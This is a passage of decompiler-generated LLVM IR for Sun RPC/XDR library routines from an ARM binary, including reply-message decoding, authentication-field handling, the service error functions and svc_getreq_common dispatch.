dec_label_pc_175ec:                               ; preds = %dec_label_pc_175c4.dec_label_pc_175ec_crit_edge, %dec_label_pc_175e4
  %v0_175ec = phi i32 [ %v0_175bc, %dec_label_pc_175c4.dec_label_pc_175ec_crit_edge ], [ %v0_175ec.pre, %dec_label_pc_175e4 ]
  store i32 %v0_175ec, i32* @r0, align 4
  %v0_175f8 = call i32 @xdr_enum()
  br label %dec_label_pc_175fc

dec_label_pc_175fc:                               ; preds = %dec_label_pc_175c4, %dec_label_pc_175d0, %entry, %dec_label_pc_175ec
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_175fc, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_175ec, { 1, 0 }
}

define i32 @__GI_xdr_replymsg(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_17604 = load i32, i32* @r4, align 4
  %v6_17604 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_17614 = call i32 @xdr_u_long()
  %v2_17618 = icmp eq i32 %v0_17614, 0
  %v0_17620 = load i32, i32* @r5, align 4
  store i32 %v0_17620, i32* @r0, align 4
  br i1 %v2_17618, label %dec_label_pc_17664, label %dec_label_pc_17628

dec_label_pc_17628:                               ; preds = %entry
  %v0_17628 = call i32 @xdr_enum()
  %v2_1762c = icmp eq i32 %v0_17628, 0
  br i1 %v2_1762c, label %dec_label_pc_17664, label %dec_label_pc_17634

dec_label_pc_17634:                               ; preds = %dec_label_pc_17628
  %v0_17634 = load i32, i32* @r4, align 4
  %v1_17634 = add i32 %v0_17634, 4
  %v2_17634 = inttoptr i32 %v1_17634 to i32*
  %v3_17634 = load i32, i32* %v2_17634, align 4
  %v7_17638 = icmp eq i32 %v3_17634, 1
  br i1 %v7_17638, label %dec_label_pc_17650, label %dec_label_pc_17664

dec_label_pc_17650:                               ; preds = %dec_label_pc_17634
  %v1_17644 = add i32 %v0_17634, 8
  %v1_17640 = add i32 %v0_17634, 12
  %v0_1763c = load i32, i32* @r5, align 4
  %v5_17658 = inttoptr i32 %v1_17644 to i32*
  %v6_17658 = call i32 @xdr_union(i32 %v0_1763c, i32* %v5_17658, i32 %v1_17640, i32 ptrtoint (i32* @global_var_1e924.900 to i32), i32 0)
  br label %dec_label_pc_17664

dec_label_pc_17664:                               ; preds = %entry, %dec_label_pc_17628, %dec_label_pc_17634, %dec_label_pc_17650
  %storemerge = phi i32 [ %v6_17658, %dec_label_pc_17650 ], [ 0, %dec_label_pc_17634 ], [ 0, %dec_label_pc_17628 ], [ 0, %entry ]
  store i32 %v3_17604, i32* @r4, align 4
  store i32 %v6_17604, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_17664, { 3, 2, 1, 0 }
}

define i32 @xdr_des_block() local_unnamed_addr {
entry:
  %v0_17674 = load i32, i32* @r0, align 4
  %v1_17674 = load i32, i32* @r1, align 4
  %v3_17674 = inttoptr i32 %v0_17674 to i32*
  %v4_17674 = call i32 @xdr_opaque(i32* %v3_17674, i32 %v1_17674, i32 8)
  ret i32 %v4_17674
}

define i32 @xdr_opaque_auth() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17678 = load i32, i32* @r4, align 4
  store i32 %v3_17678, i32* %stack_var_-12, align 4
  %v6_17678 = load i32, i32* @r5, align 4
  %v9_17678 = load i32, i32* @lr, align 4
  %v0_1767c = load i32, i32* @r1, align 4
  %v0_17680 = load i32, i32* @r0, align 4
  store i32 %v0_17680, i32* %r5.global-to-local, align 4
  %v0_17684 = call i32 @xdr_enum()
  %v2_17688 = icmp eq i32 %v0_17684, 0
  br i1 %v2_17688, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_17698 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_17698, i32* @r4, align 4
  store i32 %v6_17678, i32* @r5, align 4
  ret i32 0

bb4:                                              ; preds = %entry
  %v1_17690 = add i32 %v0_1767c, 4
  %v1_1768c = add i32 %v0_1767c, 8
  %v0_1769c = load i32, i32* %r5.global-to-local, align 4
  %v2_176a0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_176a0, i32* @r4, align 4
  store i32 %v6_17678, i32* @r5, align 4
  store i32 %v9_17678, i32* @lr, align 4
  %v4_176a4 = inttoptr i32 %v0_1769c to i32*
  %v5_176a4 = call i32 @xdr_bytes(i32* %v4_176a4, i32 %v1_17690, i32 %v1_1768c, i32 400)
  ret i32 %v5_176a4
}

define i32 @__GI_xdr_accepted_reply(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_176a8 = load i32, i32* @r4, align 4
  store i32 %v3_176a8, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_176b4 = call i32 @xdr_opaque_auth()
  %v2_176b8 = icmp eq i32 %v0_176b4, 0
  %v0_176c0 = load i32, i32* @r5, align 4
  store i32 %v0_176c0, i32* @r0, align 4
  br i1 %v2_176b8, label %dec_label_pc_17728, label %dec_label_pc_176c8

dec_label_pc_176c8:                               ; preds = %entry
  %v0_176c8 = call i32 @xdr_enum()
  %v2_176cc = icmp eq i32 %v0_176c8, 0
  br i1 %v2_176cc, label %dec_label_pc_17728, label %dec_label_pc_176d4

dec_label_pc_176d4:                               ; preds = %dec_label_pc_176c8
  %v0_176d4 = load i32, i32* @r4, align 4
  %v1_176d4 = add i32 %v0_176d4, 12
  %v2_176d4 = inttoptr i32 %v1_176d4 to i32*
  %v3_176d4 = load i32, i32* %v2_176d4, align 4
  %v2_176d8 = icmp eq i32 %v3_176d4, 0
  %v0_176dc = load i32, i32* @r5, align 4
  store i32 %v0_176dc, i32* @r0, align 4
  br i1 %v2_176d8, label %dec_label_pc_176f8, label %dec_label_pc_176e4

dec_label_pc_176e4:                               ; preds = %dec_label_pc_176d4
  %v7_176e4 = icmp eq i32 %v3_176d4, 2
  %v1_176e8 = add i32 %v0_176d4, 16
  store i32 %v1_176e8, i32* @r1, align 4
  br i1 %v7_176e4, label %dec_label_pc_1770c, label %dec_label_pc_1772c

dec_label_pc_176f8:                               ; preds = %dec_label_pc_176d4
  %v1_17700 = add i32 %v0_176d4, 20
  %v2_17700 = inttoptr i32 %v1_17700 to i32*
  %v3_17700 = load i32, i32* %v2_17700, align 4
  call void @__pseudo_branch(i32 %v3_17700)
  %v0_17704 = load i32, i32* @r0, align 4
  br label %dec_label_pc_1772c

dec_label_pc_1770c:                               ; preds = %dec_label_pc_176e4
  %v0_1770c = call i32 @xdr_u_long()
  %v2_17710 = icmp eq i32 %v0_1770c, 0
  %v0_17714 = load i32, i32* @r4, align 4
  %v1_17714 = add i32 %v0_17714, 20
  store i32 %v1_17714, i32* @r1, align 4
  %v0_17718 = load i32, i32* @r5, align 4
  store i32 %v0_17718, i32* @r0, align 4
  br i1 %v2_17710, label %dec_label_pc_17728, label %dec_label_pc_17720

dec_label_pc_17720:                               ; preds = %dec_label_pc_1770c
  %v2_17720 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17720, i32* @r4, align 4
  %v0_17724 = call i32 @xdr_u_long()
  br label %dec_label_pc_17728

dec_label_pc_17728:                               ; preds = %dec_label_pc_1770c, %dec_label_pc_176c8, %entry, %dec_label_pc_17720
  br label %dec_label_pc_1772c

dec_label_pc_1772c:                               ; preds = %dec_label_pc_176e4, %dec_label_pc_176f8, %dec_label_pc_17728
  %v0_1772c = phi i32 [ 1, %dec_label_pc_176e4 ], [ %v0_17704, %dec_label_pc_176f8 ], [ 0, %dec_label_pc_17728 ]
  ret i32 %v0_1772c

; uselistorder directives
  uselistorder label %dec_label_pc_1772c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17728, { 3, 0, 1, 2 }
}

define i32 @svc_sendreply(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_17778 = add i32 %arg1, 8
  %v2_17778 = inttoptr i32 %v1_17778 to i32*
  %v3_17778 = load i32, i32* %v2_17778, align 4
  %v1_17784 = add i32 %v3_17778, 12
  %v2_17784 = inttoptr i32 %v1_17784 to i32*
  %v3_17784 = load i32, i32* %v2_17784, align 4
  call void @__pseudo_branch(i32 %v3_17784)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_noproc(i32 %arg1) local_unnamed_addr {
entry:
  %v1_177c8 = add i32 %arg1, 8
  %v2_177c8 = inttoptr i32 %v1_177c8 to i32*
  %v3_177c8 = load i32, i32* %v2_177c8, align 4
  %v1_177d4 = add i32 %v3_177c8, 12
  %v2_177d4 = inttoptr i32 %v1_177d4 to i32*
  %v3_177d4 = load i32, i32* %v2_177d4, align 4
  call void @__pseudo_branch(i32 %v3_177d4)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_decode(i32 %arg1) local_unnamed_addr {
entry:
  %v1_17818 = add i32 %arg1, 8
  %v2_17818 = inttoptr i32 %v1_17818 to i32*
  %v3_17818 = load i32, i32* %v2_17818, align 4
  %v1_17824 = add i32 %v3_17818, 12
  %v2_17824 = inttoptr i32 %v1_17824 to i32*
  %v3_17824 = load i32, i32* %v2_17824, align 4
  call void @__pseudo_branch(i32 %v3_17824)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_systemerr(i32 %arg1) local_unnamed_addr {
entry:
  %v1_17868 = add i32 %arg1, 8
  %v2_17868 = inttoptr i32 %v1_17868 to i32*
  %v3_17868 = load i32, i32* %v2_17868, align 4
  %v1_17874 = add i32 %v3_17868, 12
  %v2_17874 = inttoptr i32 %v1_17874 to i32*
  %v3_17874 = load i32, i32* %v2_17874, align 4
  call void @__pseudo_branch(i32 %v3_17874)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_auth(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_178a0 = add i32 %arg1, 8
  %v2_178a0 = inttoptr i32 %v1_178a0 to i32*
  %v3_178a0 = load i32, i32* %v2_178a0, align 4
  %v1_178a8 = add i32 %v3_178a0, 12
  %v2_178a8 = inttoptr i32 %v1_178a8 to i32*
  %v3_178a8 = load i32, i32* %v2_178a8, align 4
  call void @__pseudo_branch(i32 %v3_178a8)
  ret i32 %arg1
}

define i32 @svcerr_weakauth() local_unnamed_addr {
entry:
  %v0_178b8 = load i32, i32* @r0, align 4
  %v2_178b8 = call i32 @svcerr_auth(i32 %v0_178b8, i32 5)
  ret i32 %v2_178b8
}

define i32 @__GI_svcerr_noprog(i32 %arg1) local_unnamed_addr {
entry:
  %v1_178f0 = add i32 %arg1, 8
  %v2_178f0 = inttoptr i32 %v1_178f0 to i32*
  %v3_178f0 = load i32, i32* %v2_178f0, align 4
  %v1_178fc = add i32 %v3_178f0, 12
  %v2_178fc = inttoptr i32 %v1_178fc to i32*
  %v3_178fc = load i32, i32* %v2_178fc, align 4
  call void @__pseudo_branch(i32 %v3_178fc)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_progvers(i32 %arg1) local_unnamed_addr {
entry:
  %v1_17950 = add i32 %arg1, 8
  %v2_17950 = inttoptr i32 %v1_17950 to i32*
  %v3_17950 = load i32, i32* %v2_17950, align 4
  %v1_1795c = add i32 %v3_17950, 12
  %v2_1795c = inttoptr i32 %v1_1795c to i32*
  %v3_1795c = load i32, i32* %v2_1795c, align 4
  call void @__pseudo_branch(i32 %v3_1795c)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svc_find(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17968 = load i32, i32* @r4, align 4
  store i32 %v3_17968, i32* %stack_var_-16, align 4
  %v6_17968 = load i32, i32* @r5, align 4
  %v9_17968 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_17978 = call i32 @__rpc_thread_variables()
  store i32 %v0_17978, i32* %r0.global-to-local, align 4
  %v1_1797c = add i32 %v0_17978, 184
  %v2_1797c = inttoptr i32 %v1_1797c to i32*
  %v3_1797c = load i32, i32* %v2_1797c, align 4
  store i32 %v3_1797c, i32* %r0.global-to-local, align 4
  %v2_179a82 = icmp eq i32 %v3_1797c, 0
  br i1 %v2_179a82, label %dec_label_pc_179b0, label %dec_label_pc_17988.lr.ph

dec_label_pc_17988.lr.ph:                         ; preds = %entry
  %v1_1798c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17988

dec_label_pc_17988:                               ; preds = %dec_label_pc_17988.lr.ph, %dec_label_pc_179a0
  %v0_179b05 = phi i32 [ 0, %dec_label_pc_17988.lr.ph ], [ %v0_179a0, %dec_label_pc_179a0 ]
  %v0_179a0 = phi i32 [ %v3_1797c, %dec_label_pc_17988.lr.ph ], [ %v2_179a4, %dec_label_pc_179a0 ]
  %v1_17988 = add i32 %v0_179a0, 4
  %v2_17988 = inttoptr i32 %v1_17988 to i32*
  %v3_17988 = load i32, i32* %v2_17988, align 4
  %v9_1798c = icmp eq i32 %v3_17988, %v1_1798c.pre
  br i1 %v9_1798c, label %dec_label_pc_17994, label %dec_label_pc_179a0

dec_label_pc_17994:                               ; preds = %dec_label_pc_17988
  %v1_17994 = add i32 %v0_179a0, 8
  %v2_17994 = inttoptr i32 %v1_17994 to i32*
  %v3_17994 = load i32, i32* %v2_17994, align 4
  %v1_17998 = load i32, i32* @r4, align 4
  %v9_17998 = icmp eq i32 %v3_17994, %v1_17998
  br i1 %v9_17998, label %dec_label_pc_17994.dec_label_pc_179b0_crit_edge, label %dec_label_pc_179a0

dec_label_pc_179a0:                               ; preds = %dec_label_pc_17988, %dec_label_pc_17994
  %v1_179a4 = inttoptr i32 %v0_179a0 to i32*
  %v2_179a4 = load i32, i32* %v1_179a4, align 4
  store i32 %v2_179a4, i32* %r0.global-to-local, align 4
  %v2_179a8 = icmp eq i32 %v2_179a4, 0
  br i1 %v2_179a8, label %dec_label_pc_179a8.dec_label_pc_179b0_crit_edge, label %dec_label_pc_17988

dec_label_pc_179a8.dec_label_pc_179b0_crit_edge:  ; preds = %dec_label_pc_179a0
  br label %dec_label_pc_179b0

dec_label_pc_17994.dec_label_pc_179b0_crit_edge:  ; preds = %dec_label_pc_17994
  br label %dec_label_pc_179b0

dec_label_pc_179b0:                               ; preds = %dec_label_pc_17994.dec_label_pc_179b0_crit_edge, %dec_label_pc_179a8.dec_label_pc_179b0_crit_edge, %entry
  %v0_179b0 = phi i32 [ %v0_179b05, %dec_label_pc_17994.dec_label_pc_179b0_crit_edge ], [ %v0_179a0, %dec_label_pc_179a8.dec_label_pc_179b0_crit_edge ], [ 0, %entry ]
  %v1_179b0 = load i32, i32* @r5, align 4
  %v2_179b0 = inttoptr i32 %v1_179b0 to i32*
  store i32 %v0_179b0, i32* %v2_179b0, align 4
  %v2_179b4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_179b4, i32* @r4, align 4
  store i32 %v6_17968, i32* @r5, align 4
  store i32 %v9_17968, i32* @r6, align 4
  %v14_179b4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v14_179b4

; uselistorder directives
  uselistorder i32 %v2_179a4, { 1, 2, 0 }
  uselistorder i32 %v0_179a0, { 0, 2, 3, 4, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder label %dec_label_pc_179a0, { 1, 0 }
  uselistorder label %dec_label_pc_17988, { 1, 0 }
}

define i32 @svc_getreq_common(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-1296 = alloca i32, align 4
  %v3_179b8 = load i32, i32* @r4, align 4
  %v2_179bc = ptrtoint i32* %stack_var_-1296 to i32
  store i32 %arg1, i32* @r4, align 4
  %v0_179d0 = call i32 @__rpc_thread_variables()
  store i32 %v0_179d0, i32* %r0.global-to-local, align 4
  %v1_179d4 = add i32 %v0_179d0, 180
  %v2_179d4 = inttoptr i32 %v1_179d4 to i32*
  %v3_179d4 = load i32, i32* %v2_179d4, align 4
  %v1_179d8 = load i32, i32* @r4, align 4
  %v4_179d8 = mul i32 %v1_179d8, 4
  %v5_179d8 = add i32 %v4_179d8, %v3_179d4
  %v6_179d8 = inttoptr i32 %v5_179d8 to i32*
  %v7_179d8 = load i32, i32* %v6_179d8, align 4
  store i32 %v7_179d8, i32* @r4, align 4
  %v2_179dc = icmp eq i32 %v7_179d8, 0
  store i32 %v0_179d0, i32* %r6.global-to-local, align 4
  br i1 %v2_179dc, label %dec_label_pc_17b4c, label %dec_label_pc_179e8.preheader

dec_label_pc_179e8.preheader:                     ; preds = %entry
  %v2_179e8 = ptrtoint i32* %stack_var_-96 to i32
  %v2_17afc = ptrtoint i32* %stack_var_-48 to i32
  %v2_17a20 = ptrtoint i32* %stack_var_-496 to i32
  %v2_17a40 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_179e8

dec_label_pc_179e8:                               ; preds = %dec_label_pc_17b44.dec_label_pc_179e8_crit_edge, %dec_label_pc_179e8.preheader
  %v0_179ec = phi i32 [ %v0_179ec.pre, %dec_label_pc_17b44.dec_label_pc_179e8_crit_edge ], [ %v7_179d8, %dec_label_pc_179e8.preheader ]
  %v1_179ec = add i32 %v0_179ec, 8
  %v2_179ec = inttoptr i32 %v1_179ec to i32*
  %v3_179ec = load i32, i32* %v2_179ec, align 4
  store i32 %v0_179ec, i32* %r0.global-to-local, align 4
  %v1_179fc = inttoptr i32 %v3_179ec to i32*
  %v2_179fc = load i32, i32* %v1_179fc, align 4
  call void @__pseudo_branch(i32 %v2_179fc)
  %v0_17a00 = load i32, i32* %r0.global-to-local, align 4
  %v2_17a00 = icmp eq i32 %v0_17a00, 0
  br i1 %v2_17a00, label %dec_label_pc_17b18, label %dec_label_pc_17a08

dec_label_pc_17a08:                               ; preds = %dec_label_pc_179e8
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  store i32 %tmp22, i32* %stack_var_-48, align 4
  store i32 %tmp36, i32* %ip.global-to-local, align 4
  %v0_17a48 = load i32, i32* @r4, align 4
  br i1 %v2_17a40, label %dec_label_pc_17a50, label %dec_label_pc_17a68

dec_label_pc_17a50:                               ; preds = %dec_label_pc_17a08
  %v2_17a54 = load i32, i32* @global_var_302f0.870, align 4
  %v2_17a58 = add i32 %v0_17a48, 32
  %v3_17a58 = inttoptr i32 %v2_17a58 to i32*
  store i32 %v2_17a54, i32* %v3_17a58, align 4
  %v0_17a60 = load i32, i32* %ip.global-to-local, align 4
  %v2_17a60 = add i32 %v0_17a48, 40
  %v3_17a60 = inttoptr i32 %v2_17a60 to i32*
  store i32 %v0_17a60, i32* %v3_17a60, align 4
  br label %dec_label_pc_17a8c

dec_label_pc_17a68:                               ; preds = %dec_label_pc_17a08
  store i32 %v2_17afc, i32* %r0.global-to-local, align 4
  %v12_17a70 = call i32 @_authenticate(i32 %v2_17afc, i32 %v2_179e8, i32 %tmp26, i32 %tmp20, i32 %tmp22, i32 %tmp37, i32 %tmp20, i32 %tmp36, i32 %v2_179bc, i32 %tmp26, i32 %v2_17a20, i32 %v0_17a48)
  store i32 %v12_17a70, i32* %r0.global-to-local, align 4
  %v2_17a74 = icmp eq i32 %v12_17a70, 0
  br i1 %v2_17a74, label %dec_label_pc_17a8c, label %dec_label_pc_17a7c

dec_label_pc_17a7c:                               ; preds = %dec_label_pc_17a68
  %v0_17a80 = load i32, i32* @r4, align 4
  store i32 %v0_17a80, i32* %r0.global-to-local, align 4
  %v2_17a84 = call i32 @svcerr_auth(i32 %v0_17a80, i32 %v12_17a70)
  store i32 %v2_17a84, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17b18

dec_label_pc_17a8c:                               ; preds = %dec_label_pc_17a68, %dec_label_pc_17a50
  %v0_17a90 = load i32, i32* %r6.global-to-local, align 4
  %v1_17a90 = add i32 %v0_17a90, 184
  %v2_17a90 = inttoptr i32 %v1_17a90 to i32*
  %v3_17a90 = load i32, i32* %v2_17a90, align 4
  store i32 %v3_17a90, i32* %ip.global-to-local, align 4
  store i32 -1, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_17adc2 = icmp eq i32 %v3_17a90, 0
  br i1 %v2_17adc2, label %dec_label_pc_17ae4.thread, label %dec_label_pc_17aa0.lr.ph

dec_label_pc_17ae4.thread:                        ; preds = %dec_label_pc_17a8c
  br label %dec_label_pc_17b10

dec_label_pc_17aa0.lr.ph:                         ; preds = %dec_label_pc_17a8c
  %v3_17aa4.pre = load i32, i32* %stack_var_-48, align 4
  br label %dec_label_pc_17aa0

dec_label_pc_17aa0:                               ; preds = %dec_label_pc_17aa0.lr.ph, %dec_label_pc_17adc
  %v0_17ae413 = phi i32 [ 0, %dec_label_pc_17aa0.lr.ph ], [ %v0_17ae412, %dec_label_pc_17adc ]
  %v1_17acc = phi i32 [ 0, %dec_label_pc_17aa0.lr.ph ], [ %v1_17acc10, %dec_label_pc_17adc ]
  %v0_17ac4 = phi i32 [ -1, %dec_label_pc_17aa0.lr.ph ], [ %v0_17ac47, %dec_label_pc_17adc ]
  %v0_17b08 = phi i32 [ %v3_17a90, %dec_label_pc_17aa0.lr.ph ], [ %v2_17ad8, %dec_label_pc_17adc ]
  %v1_17aa0 = add i32 %v0_17b08, 4
  %v2_17aa0 = inttoptr i32 %v1_17aa0 to i32*
  %v3_17aa0 = load i32, i32* %v2_17aa0, align 4
  %v9_17aa8 = icmp eq i32 %v3_17aa0, %v3_17aa4.pre
  br i1 %v9_17aa8, label %dec_label_pc_17ab0, label %dec_label_pc_17adc

dec_label_pc_17ab0:                               ; preds = %dec_label_pc_17aa0
  %v1_17ab0 = add i32 %v0_17b08, 8
  %v2_17ab0 = inttoptr i32 %v1_17ab0 to i32*
  %v3_17ab0 = load i32, i32* %v2_17ab0, align 4
  %v9_17ab8 = icmp eq i32 %v3_17ab0, %tmp37
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v9_17ab8, label %dec_label_pc_17afc, label %dec_label_pc_17ac4

dec_label_pc_17ac4:                               ; preds = %dec_label_pc_17ab0
  %v3_17ac4 = icmp ult i32 %v0_17ac4, %v3_17ab0
  br i1 %v3_17ac4, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_17ac4
  store i32 %v3_17ab0, i32* @r1, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_17ac4, %bb
  %v0_17ac48 = phi i32 [ %v0_17ac4, %dec_label_pc_17ac4 ], [ %v3_17ab0, %bb ]
  %v3_17acc = icmp uge i32 %v3_17ab0, %v1_17acc
  %v9_17acc = icmp eq i32 %v3_17ab0, %v1_17acc
  %v2_17ad0 = xor i1 %v9_17acc, true
  %v3_17ad0 = and i1 %v3_17acc, %v2_17ad0
  br i1 %v3_17ad0, label %bb43, label %bb44

bb43:                                             ; preds = %bb42
  br label %bb44

bb44:                                             ; preds = %bb42, %bb43
  %v1_17acc11 = phi i32 [ %v1_17acc, %bb42 ], [ %v3_17ab0, %bb43 ]
  %v2_17ad4 = xor i1 %v3_17acc, true
  %v3_17ad4 = or i1 %v9_17acc, %v2_17ad4
  br i1 %v3_17ad4, label %bb45, label %dec_label_pc_17adc

bb45:                                             ; preds = %bb44
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17adc

dec_label_pc_17adc:                               ; preds = %dec_label_pc_17aa0, %bb44, %bb45
  %v0_17ae412 = phi i32 [ %v0_17ae413, %dec_label_pc_17aa0 ], [ 1, %bb44 ], [ 1, %bb45 ]
  %v1_17acc10 = phi i32 [ %v1_17acc, %dec_label_pc_17aa0 ], [ %v1_17acc11, %bb44 ], [ %v1_17acc11, %bb45 ]
  %v0_17ac47 = phi i32 [ %v0_17ac4, %dec_label_pc_17aa0 ], [ %v0_17ac48, %bb44 ], [ %v0_17ac48, %bb45 ]
  %v1_17ad8 = inttoptr i32 %v0_17b08 to i32*
  %v2_17ad8 = load i32, i32* %v1_17ad8, align 4
  store i32 %v2_17ad8, i32* %ip.global-to-local, align 4
  %v2_17adc = icmp eq i32 %v2_17ad8, 0
  br i1 %v2_17adc, label %dec_label_pc_17ae4, label %dec_label_pc_17aa0

dec_label_pc_17ae4:                               ; preds = %dec_label_pc_17adc
  %v2_17ae4 = icmp eq i32 %v0_17ae412, 0
  br i1 %v2_17ae4, label %dec_label_pc_17b10, label %dec_label_pc_17aec

dec_label_pc_17aec:                               ; preds = %dec_label_pc_17ae4
  store i32 %v1_17acc10, i32* @r2, align 4
  %v0_17af0 = load i32, i32* @r4, align 4
  store i32 %v0_17af0, i32* %r0.global-to-local, align 4
  %v1_17af4 = call i32 @svcerr_progvers(i32 %v0_17af0)
  store i32 %v1_17af4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17b18

dec_label_pc_17afc:                               ; preds = %dec_label_pc_17ab0
  store i32 %v2_17afc, i32* %r0.global-to-local, align 4
  %v1_17b08 = add i32 %v0_17b08, 12
  %v2_17b08 = inttoptr i32 %v1_17b08 to i32*
  %v3_17b08 = load i32, i32* %v2_17b08, align 4
  call void @__pseudo_branch(i32 %v3_17b08)
  br label %dec_label_pc_17b18

dec_label_pc_17b10:                               ; preds = %dec_label_pc_17ae4.thread, %dec_label_pc_17ae4
  %v0_17b10 = load i32, i32* @r4, align 4
  store i32 %v0_17b10, i32* %r0.global-to-local, align 4
  %v1_17b14 = call i32 @__GI_svcerr_noprog(i32 %v0_17b10)
  store i32 %v1_17b14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17b18

dec_label_pc_17b18:                               ; preds = %dec_label_pc_179e8, %dec_label_pc_17afc, %dec_label_pc_17aec, %dec_label_pc_17a7c, %dec_label_pc_17b10
  %v0_17b18 = load i32, i32* @r4, align 4
  %v1_17b18 = add i32 %v0_17b18, 8
  %v2_17b18 = inttoptr i32 %v1_17b18 to i32*
  %v3_17b18 = load i32, i32* %v2_17b18, align 4
  store i32 %v0_17b18, i32* %r0.global-to-local, align 4
  store i32 97064, i32* @lr, align 4
  %v1_17b24 = add i32 %v3_17b18, 4
  %v2_17b24 = inttoptr i32 %v1_17b24 to i32*
  %v3_17b24 = load i32, i32* %v2_17b24, align 4
  call void @__pseudo_branch(i32 %v3_17b24)
  %v0_17b28 = load i32, i32* %r0.global-to-local, align 4
  %v2_17b28 = icmp eq i32 %v0_17b28, 0
  br i1 %v2_17b28, label %dec_label_pc_17b30, label %dec_label_pc_17b44

dec_label_pc_17b30:                               ; preds = %dec_label_pc_17b18
  %v0_17b30 = load i32, i32* @r4, align 4
  store i32 %v0_17b30, i32* %r0.global-to-local, align 4
  %v1_17b34 = add i32 %v0_17b30, 8
  %v2_17b34 = inttoptr i32 %v1_17b34 to i32*
  %v3_17b34 = load i32, i32* %v2_17b34, align 4
  store i32 97088, i32* @lr, align 4
  %v1_17b3c = add i32 %v3_17b34, 20
  %v2_17b3c = inttoptr i32 %v1_17b3c to i32*
  %v3_17b3c = load i32, i32* %v2_17b3c, align 4
  call void @__pseudo_branch(i32 %v3_17b3c)
  %v14_17b50.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17b4c

dec_label_pc_17b44:                               ; preds = %dec_label_pc_17b18
  %v7_17b44 = icmp eq i32 %v0_17b28, 1
  br i1 %v7_17b44, label %dec_label_pc_17b44.dec_label_pc_179e8_crit_edge, label %dec_label_pc_17b4c

dec_label_pc_17b44.dec_label_pc_179e8_crit_edge:  ; preds = %dec_label_pc_17b44
  %v0_179ec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_179e8

dec_label_pc_17b4c:                               ; preds = %dec_label_pc_17b44, %entry, %dec_label_pc_17b30
  %v14_17b50 = phi i32 [ %v0_179d0, %entry ], [ %v14_17b50.pre, %dec_label_pc_17b30 ], [ %v0_17b28, %dec_label_pc_17b44 ]
  store i32 %v3_179b8, i32* @r4, align 4
  ret i32 %v14_17b50

; uselistorder directives
  uselistorder i32 %v2_17ad8, { 1, 2, 0 }
  uselistorder i1 %v9_17acc, { 1, 0 }
  uselistorder i32 %v3_17ab0, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v0_17ac4, { 2, 1, 0 }
  uselistorder i32 %v1_17acc, { 3, 2, 0, 1 }
  uselistorder i32 %v0_17a48, { 1, 2, 0 }
  uselistorder i32 %v0_179ec, { 1, 0 }
  uselistorder i32 %v2_17afc, { 2, 1, 0 }
  uselistorder i32 %tmp37, { 1, 0 }
  uselistorder i32 %tmp36, { 3, 2, 0, 1 }
